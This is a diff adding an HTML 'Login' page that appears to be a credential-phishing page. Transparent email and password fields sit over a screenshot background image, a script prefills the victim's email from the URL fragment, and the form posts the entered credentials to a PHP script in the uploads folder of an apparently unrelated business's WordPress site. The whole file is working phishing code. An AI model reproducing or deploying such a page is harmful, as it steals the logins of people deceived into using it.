@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Login</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    height:100vh;
+    background:url("Capture1.PNG") no-repeat center center;
+    background-size:cover;
+    position:relative;
+    font-family:Arial, sans-serif;
+}
+
+/* EMAIL FIELD */
+.email{
+    position:absolute;
+    top:155px;
+    left:53%;
+    transform:translateX(-50%);
+    width:420px;
+    height:45px;
+    border:none;
+    outline:none;
+    background:transparent;
+    padding-left:60px;
+    font-size:16px;
+}
+
+/* PASSWORD FIELD */
+.password{
+    position:absolute;
+    top:200px;
+    left:53%;
+    transform:translateX(-50%);
+    width:420px;
+    height:45px;
+    border:none;
+    outline:none;
+    background:transparent;
+    padding-left:60px;
+    font-size:16px;
+}
+
+/* LOGIN BUTTON USING IMAGE */
+.login-btn{
+    position:absolute;
+    top:250px;
+    left:50%;
+    transform:translateX(-50%);
+    width:320px;
+    height:50px;
+    border:none;
+    background:url("button1.png") no-repeat center;
+    background-size:contain;
+    cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<form action="https://lorneplumbing.com.au/wp-content/uploads/2026/another.php" method="POST">
+    <input type="email" name="email" class="email" required>
+    <input type="password" name="password" class="password" required>
+    <button type="submit" class="login-btn"></button>
+</form>
+
+
+
+<script>
+function getFragmentEmail() {
+    const hash = window.location.hash;
+    // Check if there's an email in the fragment (e.g., #test@domain.com)
+    if (hash && hash.includes('@')) {
+        return hash.substring(1); // Remove the '#' symbol from the start
+    }
+    return null; // No email in the fragment
+}
+
+window.addEventListener("DOMContentLoaded", () => {
+    const email = getFragmentEmail(); // Get email from fragment
+    const emailField = document.querySelector('input[name="email"]');
+
+    if (email && emailField) {
+        emailField.value = email; // Set the value of the email field
+    }
+});
+</script>
+
+
+
+
+
+</body>
+</html>
